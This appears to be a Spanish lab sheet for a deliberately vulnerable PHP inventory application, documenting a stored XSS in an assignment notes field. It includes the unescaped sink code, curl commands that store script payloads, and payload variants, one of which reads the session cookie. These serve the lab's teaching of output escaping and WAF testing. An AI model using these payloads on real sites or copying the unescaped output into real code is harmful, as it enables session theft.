# LAB-04 — XSS almacenado en las observaciones de una asignación

| Campo | Valor |
|---|---|
| **ID** | LAB-04 |
| **Tipo** | XSS — Cross-Site Scripting almacenado / persistente (segunda orden) |
| **Riesgo** | Medio |
| **CWE** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| **OWASP** | A03:2021 — Injection |
| **Endpoint (entrada)** | `POST /fa/sistemas/assignments/create.php` campo `observaciones` |
| **Endpoint (sink)** | `GET /fa/sistemas/assignments/index.php`, columna Observaciones |
| **Acceso** | Requiere sesión iniciada. Escribir: rol Administrador (1) o Técnico (2) |
| **Implementada** | 26 de septiembre de 2026 |

---

## 1. Qué hace

El formulario de asignación de equipos tiene un campo de texto libre,
**Observaciones**. Lo que se escribe ahí se guarda en la tabla `assignments` tal
cual llega del `POST`, sin transformar un solo carácter.

Después, el listado de asignaciones imprime esa columna **sin escapar**. La
consecuencia es que el texto que escribió una persona se convierte en HTML en el
navegador de quien abra el listado, y si contiene un `<script>`, se ejecuta.

La diferencia con un XSS reflejado es importante, y es lo que hace esta práctica
interesante:

- En un XSS reflejado el atacante manda un enlace con el payload y solo se
  compromete a sí mismo.
- En un XSS **almacenado** el payload queda **en la base de datos**. Se ejecuta
  cada vez que alguien abre la página, y esa persona no tiene que hacer nada
  raro: tiene que consultar un listado que la aplicación le ofrece a propósito.

Por eso se llama también **segunda orden**: el fallo no está en la petición que
recibe el atacante, sino en una petición distinta, posterior y hecha por otra
persona. El atacante y la víctima no son el mismo usuario.

El caso más grave es la escalada de privilegios. El campo Observaciones solo lo
escriben los roles Administrador y Técnico, pero el listado de asignaciones lo
abre **cualquier usuario con sesión**, incluido el rol Consulta. Es decir: un
Técnico escribe el payload, y le explota el navegador a un Administrador. El
script corre con los privilegios de la sesión de la víctima, en el mismo origen
que la aplicación.

Hay un segundo sink en `equipment/view.php` que merece nombre aparte, y está en
la sección 2.3.

---

## 2. Dónde está el código

### 2.1 El sink: la celda que no escapa

`assignments/index.php`, línea 188:

```php
<td>
    <?php
    // ------------------------------------------------------------
    // SINK VULNERABLE - LAB-04
    // Sin e() a proposito. Comparar con el resto de celdas.
    // ------------------------------------------------------------
    ?>
    <?php echo $a['observaciones']; ?>
</td>
```

La comparación con las celdas vecinas es el argumento más fuerte de la ficha,
porque **todas** las demás usan `e()` en la misma tabla y en el mismo bucle:

```php
<a href="<?php echo url('equipment/view.php?id=' . (int) $a['equipment_id']); ?>">
    <?php echo e($a['model']); ?>
</a>
<div class="text-muted small mono"><?php echo e($a['inventory_number']); ?></div>
...
<a href="<?php echo url('employees/view.php?id=' . (int) $a['employee_id']); ?>">
    <?php echo e($a['apellido'] . ', ' . $a['nombre']); ?>
</a>
<div class="text-muted small mono"><?php echo e($a['numero_empleado']); ?></div>
<td class="small"><?php echo format_date($a['fecha_asignacion']); ?></td>
...
<?php echo status_badge($a['estado_equipo']); ?>
```

Y `status_badge()` también escapa por dentro (`config/app.php`, línea 154):

```php
return '<span class="badge ' . $class . '">' . e($status) . '</span>';
```

Ese `e()` que falta **ya existe** en el proyecto. `config/app.php`, línea 76:

```php
function e($text)
{
    return htmlspecialchars((string) $text, ENT_QUOTES, 'UTF-8');
}
```

No falta la función de escapado. Falta la llamada, en una línea.

### 2.2 La entrada: se guarda tal cual

`assignments/create.php`, líneas 85 a 97:

```php
if (count($errores) === 0) {
    // El observaciones se guarda TAL CUAL. No hay htmlspecialchars ni e().
    // LAB-04: el valor se imprime sin escapar en assignments/index.php.
    db_exec(
        "INSERT INTO assignments (equipment_id, employee_id, fecha_asignacion, observaciones)
         VALUES (?, ?, ?, ?)",
        array(
            $equipo['id'],
            $empleado['id'],
            $fecha,
            $old['observaciones'] !== '' ? $old['observaciones'] : null
        )
    );
```

El `INSERT` usa parámetros vinculados, así que **no hay SQL injection aquí**. El
dato entra perfecto en la base. Lo que pasa es que llega siendo código.

Y aquí está la trampa mental que conviene desmontar: el formulario sí escapa al
repintar el valor en la caja de texto (`assignments/create.php`, línea 197):

```php
<input type="text" class="form-control" id="observaciones" name="observaciones"
       value="<?php echo e($old['observaciones']); ?>"
       placeholder="Condiciones de entrega, accesorios incluidos">
```

Ese `e()` protege la caja de texto, y nada más. Evita que el `<` rompa el
atributo `value` si el formulario se recarga con errores. **No cambia lo que se
guarda**, que es el `POST` crudo que llegó del navegador. Quien mira el
formulario y ve el escapado, y concluye que el campo está protegido, está
mirando la protección equivocada.

### 2.3 El segundo sink: la descripción del equipo

`equipment/view.php`, línea 143:

```php
<div class="mb-3">
    <div class="detail-label">Descripcion</div>
    <div class="detail-value">
        <?php
        // -------------------------------------------------------------
        // VULNERABILIDAD DELIBERADA (LAB-04b).
        // La descripcion se imprime sin escapar. Un payload
        // <script> o <img onerror> guardado en el alta se ejecuta
        // aqui. El camino correcto es e($eq['description']).
        // -------------------------------------------------------------
        lab_render_untrusted($eq['description']);
        ?>
    </div>
</div>
```

`lab_render_untrusted()` está en `config/lab_store.php`, línea 53:

```php
function lab_render_untrusted($text)
{
    // ESTA ES LA VULNERABILIDAD DELIBERADA (LAB-04b).
    // No se escapa: el HTML del dato se interpreta tal cual.
    echo $text;
}
```

Este sink es un vector de **primer orden**: el atacante escribe el payload en el
propio formulario de alta o edición del equipo, y se lo ve a sí mismo. Sirve
para demostrar el fallo, pero **no es el interesante**. El de
`assignments/index.php` es el peligroso, porque el dato lo escribe una persona y
lo ejecuta otra distinta.

### 2.4 La corrección

Una línea, en el sink:

```php
<?php echo e($a['observaciones']); ?>
```

Y para el segundo sink, sustituir la llamada por la función correcta:

```php
<?php echo e($eq['description']); ?>
```

`config/lab_store.php` incluye además la referencia explícita de la versión
segura, línea 70:

```php
function secure_render_untrusted($text)
{
    return htmlspecialchars((string) $text, ENT_QUOTES, 'UTF-8');
}
```

Esa función no la usa la aplicación: está como documentación del punto de
corrección, igual que `secure_login()` en LAB-01.

### Por qué escapar en la entrada no sirve

Es tentador arreglar esto en `assignments/create.php`, aplicando
`htmlspecialchars()` antes del `INSERT`. No funciona como corrección, por tres
motivos:

1. **El dato ya está en la base.** En el momento en que descubres el problema
   puede que haya cientos de filas con HTML dentro, escritas antes de la
   corrección. Escapar en la entrada no las repara: hay que sanear la base o
   escapar en la salida.
2. **Rompe la Round Trip.** Si escapas al guardar y escapas otra vez al
   imprimir, el usuario ve `&lt;b&gt;` en lugar de `<b>`. El campo deja de ser
   un campo de texto y pasa a ser un campo de marcado, y nadie lo pidió.
3. **No cubre el resto de las fuentes.** La misma columna se puede alimentar
   desde una importación por CSV, desde un script de carga inicial o desde otro
   formulario. Si el escapado vive en el punto de entrada, cada nueva fuente
   vuelve a abrir el fallo.

La regla que queda: **el escapado se aplica en el punto de salida, en todos los
puntos de salida.** Nunca se guarda HTML escapado en la base, y nunca se
confía en que un dato que "ya se limpió al entrar" siga limpio al salir.

Lo que sí tiene sentido en la entrada es **validar**, no escapar: por ejemplo,
limitar la longitud del campo o rechazar caracteres de control. Eso reduce el
ruido, pero no sustituye a `e()`.

---

## 3. Por qué existe en una app real

Este patrón es más raro que el XSS reflejado, y su historia es siempre la misma:
una columna nueva, un campo más en el formulario, y la celda del listado que se
añade al final "para que se vea".

> Se añadió el campo Observaciones para dejar constancia de las condiciones de
> entrega. Se añadió el `<input>` al formulario de alta con `e()` en el `value`,
> porque el formulario ya usaba `e()` en todas las cajas. Dos meses después se
> añadió la columna al listado de la tabla, y en esa celda se escribió `echo`
> "a pelo" porque el modelo de datos ya estaba cargado y nadie pensó en el
> escapado: la columna se añadió al final, es la menos importante y es la única
> que nadie revisó.

La traza es tan común que la aplicación conserva las dos huellas:

- El resto de la aplicación **sí** escapa en todas partes. `equipment/index.php`,
  `employees/view.php`, `assignments/return.php`: todo pasa por `e()`. Quien
  escribió esa celda no estaba en un entorno sin criterio, estaba en un entorno
  con criterio y se saltó una línea.
- El **mismo dato** se imprime correctamente a unas líneas de distancia, en la
  ficha de devolución. `assignments/return.php`, línea 132:

  ```php
  <div class="detail-value small"><?php echo e($asignacion['observaciones']); ?></div>
  ```

Los dos printouts leen la misma columna. Uno escapa y el otro no. Esa es la
prueba definitiva de que la entrada no es el problema: si lo fuera, los dos
lugares fallarían.

---

## 4. Payloads

Probados contra `http://localhost/fa/sistemas` el 26 de septiembre de 2026.

### Sesión previa

`assignments/create.php` exige rol Administrador (1) o Técnico (2), así que la
sesión de control es la de `admin`.

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://localhost/fa/sistemas/login.php
```

### Elige un equipo realmente disponible

El formulario de asignación **no** acepta cualquier equipo: exige estado
`Disponible` y que no tenga ya una asignación activa. Elegir a ciegas falla con
un mensaje de validación, y ese fallo se confunde fácilmente con "la
vulnerabilidad no funciona". El equipo se localiza por el buscador, igual que
hace `documents/lab_matrix.sh`:

```bash
EQUIPO_ID=$(curl -s -b cookies.txt --get \
              --data-urlencode "q=" \
              --data-urlencode "estado=Disponible" \
              http://localhost/fa/sistemas/equipment/search.php \
            | grep -oE 'equipment/view\.php\?id=[0-9]+' | head -1 | grep -oE '[0-9]+')
echo "equipo elegido: $EQUIPO_ID"
```

### Control: el listado abre normal

```bash
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt \
  http://localhost/fa/sistemas/assignments/index.php
```

Resultado medido: `200`. La página carga y la tabla se pinta. Esto demuestra que
el WAF, en Escenario B, no rompe el uso normal.

### Ataque: guardar el payload en Observaciones

```bash
curl -s -o /dev/null -b cookies.txt \
  --data-urlencode "equipment_id=$EQUIPO_ID" \
  --data-urlencode "employee_id=1" \
  --data-urlencode "fecha_asignacion=$(date +%F)" \
  --data-urlencode "observaciones=<script>alert('XSSLAB04MARK')</script>" \
  http://localhost/fa/sistemas/assignments/create.php
```

El `--data-urlencode` es obligatorio: sin él, el `<` y el `>` se codifican como
`%3C` y `%3E` y el payload llega a la base como texto inerte.

### Verificación: el script crudo en el HTML servido

```bash
for pg in 1 2 3; do
  RAW=$(curl -s -b cookies.txt "http://localhost/fa/sistemas/assignments/index.php?page=$pg" \
        | grep -c "<script>alert('XSSLAB04MARK')</script>")
  echo "pagina $pg -> $RAW"
  [ "$RAW" -gt 0 ] && break
done
```

Resultado medido:

```
pagina 1 -> 1
```

El `grep -c` cuenta **1**: el `<script>alert('XSSLAB04MARK')</script>` aparece
**crudo** en el HTML servido. No aparece como `&lt;script&gt;`, que es como lo
vería un navegador si la salida estuviera escapada. Eso es el fallo.

Se revisan las páginas 1 a 3 porque el listado pagina de 15 en 15 y ordena por
`fecha_asignacion DESC, id DESC`: la fila recién creada cae en la primera página
salvo que el seed tenga actividad con fecha posterior. El bucle cubre los tres
casos en lugar de asumir uno solo.

### Control decisivo: el mismo dato, escapado, en otra página

```bash
ASIGNACION_ID=$(curl -s -b cookies.txt http://localhost/fa/sistemas/assignments/index.php \
                   | grep -oE 'assignments/return\.php\?id=[0-9]+' | head -1 | grep -oE '[0-9]+')

curl -s -b cookies.txt "http://localhost/fa/sistemas/assignments/return.php?id=$ASIGNACION_ID" \
  | grep -oE '&lt;script&gt;alert\(&#039;XSSLAB04MARK&#039;\)&lt;/script&gt;'
```

Resultado medido:

```
&lt;script&gt;alert(&#039;XSSLAB04MARK&#039;)&lt;/script&gt;
```

El **mismo valor**, de la **misma fila**, sale escapado en `return.php` y crudo en
`index.php`. Un solo `e()` de diferencia. Esta es la prueba más limpia del
laboratorio, porque descarta de raíz cualquier explicación alternativa: la
entrada es la misma, el dato es el mismo, y el único cambio es la llamada a `e()`.

### Segundo sink: descripción del equipo

Payload verificado: tras guardar `<script>alert('XSSLAB04MARK')</script>` en el
campo Descripción del alta o la edición de un equipo, la ficha lo sirve crudo.

```bash
curl -s -b cookies.txt "http://localhost/fa/sistemas/equipment/view.php?id=$EQUIPO_ID" \
  | grep -c "<script>alert('XSSLAB04MARK')</script>"
```

Resultado medido: `1`.

### Variantes que también funcionan

Todas verificadas sobre `assignments/index.php`. El marcador cambia, el sink es el mismo:

| Payload en `observaciones` | Efecto en el navegador de la víctima |
|---|---|
| `<script>alert('XSSLAB04MARK')</script>` | Script ejecutado. Marcador de la matriz |
| `<img src=x onerror=alert('XSSLAB04MARK')>` | Script ejecutado sin etiqueta `<script>` |
| `<svg/onload=alert('XSSLAB04MARK')>` | Script ejecutado. Útil si alguien filtra `<script>` |
| `<script>alert(document.cookie)</script>` | Roba la cookie de sesión `SIGISESSID` |

La cuarta es la que da peso real a la escalada: la cookie que se roba es la de
la **víctima**, no la del atacante. Es lo que convierte un XSS almacenado de
"Medio" en un incidente de verdad.

---

## 5. Escenario A vs Escenario B

El objetivo de la demostración es comparar el **mismo código** en los dos lados.

| Prueba | Escenario A (Apache directo) | Escenario B (SafeLine) |
|---|---|---|
| 1. Listado de asignaciones (control) | HTTP 200, tabla pintada | HTTP 200, tabla pintada |
| 2. Alta de asignación con texto normal | Se guarda | Se guarda |
| 3. Ficha de devolución (control) | Payload escapado | Payload escapado |
| 4. `<script>alert('XSSLAB04MARK')</script>` en Observaciones | **Se guarda y se ejecuta** | **Bloqueado** |
| 5. `<img src=x onerror=...>` en Observaciones | **Se guarda y se ejecuta** | **Bloqueado** |
| 6. Payload en la Descripción del equipo | **Se guarda y se ejecuta** | **Bloqueado** |

Las tres primeras filas son el control: deben comportarse igual en ambos
escenarios, para demostrar que el WAF no rompe el uso normal.

Ejecución automatizada con [`lab_matrix.sh`](lab_matrix.sh):

```bash
# Escenario A
./documents/lab_matrix.sh

# Escenario B
./documents/lab_matrix.sh http://192.168.100.22:8000/fa/sistemas --waf
```

### Sesión y comandos

Escenario A, `http://localhost/fa/sistemas`:

```bash
# Control: el listado responde
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt \
  http://localhost/fa/sistemas/assignments/index.php

# Ataque: guardar el payload
curl -s -o /dev/null -b cookies.txt \
  --data-urlencode "equipment_id=$EQUIPO_ID" \
  --data-urlencode "employee_id=1" \
  --data-urlencode "fecha_asignacion=$(date +%F)" \
  --data-urlencode "observaciones=<script>alert('XSSLAB04MARK')</script>" \
  http://localhost/fa/sistemas/assignments/create.php

# Verificación: el script crudo en el listado
curl -s -b cookies.txt http://localhost/fa/sistemas/assignments/index.php \
  | grep -c "<script>alert('XSSLAB04MARK')</script>"
```

Escenario B, `http://192.168.100.22:8000/fa/sistemas` — mismos comandos, mismo
orden, solo cambia el host. **Esta ejecución todavía no se ha hecho**: SafeLine
no está instalado y se desplegará después, en el VPS. Todo lo de esta tabla es
comportamiento esperado, no medido.

```bash
# Control: el listado responde
curl -s -o /dev/null -w "%{http_code}\n" -b cookies.txt \
  http://192.168.100.22:8000/fa/sistemas/assignments/index.php

# Ataque: guardar el payload
curl -s -o /dev/null -b cookies.txt \
  --data-urlencode "equipment_id=$EQUIPO_ID" \
  --data-urlencode "employee_id=1" \
  --data-urlencode "fecha_asignacion=$(date +%F)" \
  --data-urlencode "observaciones=<script>alert('XSSLAB04MARK')</script>" \
  http://192.168.100.22:8000/fa/sistemas/assignments/create.php

# Verificación
curl -s -b cookies.txt http://192.168.100.22:8000/fa/sistemas/assignments/index.php \
  | grep -c "<script>alert('XSSLAB04MARK')</script>"
```

En Escenario B el `grep -c` debe devolver `0`: el `POST` con el payload no llega
a `assignments/create.php`, así que el payload **ni siquiera llega a almacenarse**.
Ese es el detalle que distingue a un WAF de un filtro de salida, y es la razón
por la que el marcador debe buscarse en el listado y no solo en la respuesta del
alta.

### Marcadores exactos que usa la matriz

`documents/lab_matrix.sh` no adivina: busca una cadena exacta en el cuerpo de la
respuesta.

| Prueba | Marcador exacto | Interpretación |
|---|---|---|
| LAB-04 | `<script>alert('XSSLAB04MARK')</script>` | Si aparece **crudo**, el HTML no se escapó |

Ese es el único marcador de esta práctica. La matriz no busca `onerror`, ni
`document.cookie`, ni ninguna otra variante: una sola cadena, escrita con un
marcador identificable que no pueda aparecer por casualidad en el contenido real
de una observación.

El marcador de LAB-04 se genera con la variable `MARK="XSSLAB04MARK"`
(`documents/lab_matrix.sh`, línea 248) y se busca en las páginas 1, 2 y 3 del
listado:

```bash
for pg in 1 2 3; do
    RAW=$(curl -s -b "$JAR_ADM" "$BASE_URL/assignments/index.php?page=$pg" \
          | grep -c "<script>alert('$MARK')</script>")
    [ "$RAW" -gt 0 ] && break
done
```

La lógica se invierte con la bandera `--waf`: en Escenario A la prueba debe
pasar (`RAW > 0`), en Escenario B debe quedar sin marcador y reportarse como
bloqueada.

El detalle de por qué la matriz escoge el equipo con el buscador no es
estético: si elige uno que no está `Disponible`, el `POST` se rechaza por
validación de negocio, el payload no se guarda y el listado no lo muestra. La
prueba falla y parece que la aplicación no es vulnerable, cuando lo que falló
fue la preparación. Lo mismo ocurre con `employee_id=1` si ese empleado estuviera
inactivo.

Al terminar, la matriz cierra la asignación con la propia aplicación
(`assignments/return.php`), para que el equipo vuelva a `Disponible` y el
inventario quede como estaba.

---

## 6. Qué debería hacer SafeLine

SafeLine analiza el cuerpo del `POST` en `assignments/create.php` y debe
clasificar el campo `observaciones` como XSS **antes** de que la solicitud
llegue a Apache.

| Aspecto | Valor esperado |
|---|---|
| Regla activada | XSS (parámetro `observaciones`, y `description` en el alta de equipo) |
| Modo recomendado | `Strict` |
| Respuesta | Página de bloqueo de SafeLine, no el formulario de la app |
| Origen en la app | Ninguna: el `POST` no debe llegar a `assignments/create.php` |
| Efecto secundario esperado | `assignments` no debe crecer con una fila nueva |

Ese último punto es la prueba de que el corte ocurrió **antes** de la
aplicación, y es la diferencia entre "bloqueado" y "no almacenado":

```sql
SELECT COUNT(*) FROM assignments;   -- repetir antes y despues del Escenario B
```

Si el conteo no aumenta, el payload se detuvo en el WAF. En Escenario A el mismo
conteo sí aumenta en 1 por cada intento, y la fila queda con el script dentro
para siempre.

El campo de entrada es el punto de control, pero conviene ser honesto sobre lo
que un WAF **no** puede hacer aquí:

- **No repara lo que ya está guardado.** Si el payload entró antes de instalar
  SafeLine, sigue ahí y sigue ejecutándose. Un WAF protege el camino de
  entrada; no limpia el almacén. Hay que sanear los datos existentes por
  separado.
- **No cubre fuentes que no son peticiones HTTP.** Una importación por CSV, un
  `INSERT` en un script de carga o un proceso que escriba en la tabla no pasan
  por el proxy. Para eso está el escapado en la salida.

Por eso la conclusión del laboratorio no es "SafeLine lo arregla", sino "SafeLine
cierra la puerta mientras se arregla el código".

---

## 7. Aislamiento de la vulnerabilidad

Regla del proyecto: **un solo punto vulnerable por práctica**, para que el
resultado de la matriz no se mezcle.

- El sink principal está en **una sola línea** de **un solo archivo**:
  `assignments/index.php`, línea 188.
- El segundo sink está aislado detrás de una función con nombre propio,
  `lab_render_untrusted()` en `config/lab_store.php`, que solo se llama desde
  `equipment/view.php`. Así se puede desactivar sin tocar el resto.
- `assignments/return.php` imprime **la misma columna** con `e()` (línea 132).
  Sirve de control interno: si algún día esa línea cambiara, la comparación
  seguiría siendo válida dentro de la propia aplicación.
- Ninguna otra vista de la aplicación imprime columnas de texto libre sin
  `e()`. `equipment/index.php`, `employees/view.php` y `audit/` escapan en
  todas sus celdas.
- `assignments/create.php` **no** tiene SQL injection: el `INSERT` usa
  parámetros vinculados. Los dos laboratorios no se mezclan.

### Nota del entorno: el `.htaccess` no es una mitigación

Un `.htaccess` en `uploads/` o en el directorio del módulo parece la respuesta
rápida, y aquí **no funciona**. La configuración de Apache tiene:

```
AllowOverride None
```

en los cuatro directorios de la configuración principal. Con `AllowOverride
None`, Apache **ignora** cualquier `.htaccess` que se deje en el árbol. No es una
limitación del laboratorio: es el comportamiento por defecto de la distribución
de Debian y Ubuntu, precisamente para que el rendimiento de la búsqueda de
archivos `.htaccess` en cada request no dependa del contenido del directorio.

La consecuencia para esta práctica es concreta:

- No se puede añadir `Content-Security-Policy` desde `.htaccess`.
- No se puede añadir `X-XSS-Protection` ni `X-Content-Type-Options` desde
  `.htaccess`.
- No se puede bloquear el `.php` de `uploads/` desde `.htaccess`.

Esas tres cosas requieren tocar la configuración de Apache, que necesita `sudo`
y además **debe reconfigurarse en el servidor de SafeLine**, porque el proxy es
la primera puerta. Por eso la única vía de mitigación que está al alcance del
laboratorio es **el código**, y por eso la corrección que importa es el `e()`
del sink.

El riesgo estructural del entorno queda fuera del alcance de esta ficha pero es
conveniente recordarlo: `uploads/` está bajo el document root, con permisos `777`
en `/var/www/html`. Cualquier archivo que se deposite ahí queda servible por URL.
Eso es LAB-06, no LAB-04, pero comparte la misma raíz: el servidor sirve como
archivo lo que se le pone en el directorio.

---

## 8. La conclusión del laboratorio

Este caso enseña algo que los otros no: **el WAF detiene el ataque, y aun así la
vulnerabilidad sigue siendo la de la aplicación.**

SafeLine va a bloquear el `<script>` en el `POST`. Perfecto. Pero:

1. Lo que ya está en la base sigue ejecutándose. Un WAF limpia el camino de
   entrada, no el almacén.
2. El fallo es de una línea, y esa línea está en el sitio donde el dato se
   imprime. Si mañana alguien añade una vista nueva —un exportador, una API, un
   PDF— y escribe `echo` en esa celda, el XSS vuelve, y el WAF no lo verá porque
   el `POST` original fue hace meses y era perfectamente limpio.
3. Un WAF que bloquea `document.cookie` en un cuerpo de `POST` sigue sin
   impedir que un `<img onerror>` o un `<svg onload>` hagan lo mismo. Se puede
   esquivar; el escapado no.

La corrección real es una línea, y ya se ha escrito arriba:

```php
<?php echo e($a['observaciones']); ?>
```

`e()` está definida en `config/app.php`, se usa en el resto de la aplicación, y
se aplica correctamente en `assignments/return.php` sobre la misma columna. La
página `index.php` se olvidó de llamarla.

La lección final es la regla de la sección 2.4, y vale para toda la aplicación:
**escapar en la entrada es una suposición; escapar en la salida es una
garantía.** Solo la segunda sobrevive a los datos que ya están guardados, a los
que llegan por otra vía, y a la vista que alguien escribirá dentro de dos años.
